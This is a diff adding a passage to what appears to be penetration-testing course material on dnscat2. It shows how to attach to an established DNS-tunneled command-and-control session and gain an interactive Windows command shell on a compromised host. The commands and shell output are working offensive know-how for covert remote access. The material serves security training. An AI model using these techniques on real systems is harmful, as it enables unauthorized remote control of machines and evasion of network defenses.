@@ -547,3 +547,27 @@ Here is a list of commands (use -h on any of them for additional help):
 * window
 * windows
 ```
+We can use dnscat2 to interact with sessions and move further in a target environment on engagements. We will not cover all possibilities with dnscat2 in this module, but it is strongly encouraged to practice with it and maybe even find creative ways to use it on an engagement. Let's interact with our established session and drop into a shell.
+  
+Interacting with the Established Session
+```
+dnscat2> window -i 1
+New window created: 1
+history_size (session) => 1000
+Session 1 Security: ENCRYPTED AND VERIFIED!
+(the security depends on the strength of your pre-shared secret!)
+This is a console session!
+
+That means that anything you type will be sent as-is to the
+client, and anything they type will be displayed as-is on the
+screen! If the client is executing a command and you don't
+see a prompt, try typing 'pwd' or something!
+
+To go back, type ctrl-z.
+
+Microsoft Windows [Version 10.0.18363.1801]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+exec (OFFICEMANAGER) 1>
+```
